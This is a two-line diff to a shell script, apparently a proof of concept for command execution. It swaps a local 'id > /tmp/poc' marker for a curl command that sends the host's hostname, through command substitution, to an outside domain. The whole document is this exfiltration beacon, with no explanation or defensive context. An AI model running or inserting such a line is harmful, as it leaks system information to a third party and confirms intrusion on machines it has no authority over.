@@ -1,2 +1,2 @@
 #!/bin/sh
-id > /tmp/poc
+curl "linkyzhou.mktwo.cn/?a=`hostname`"
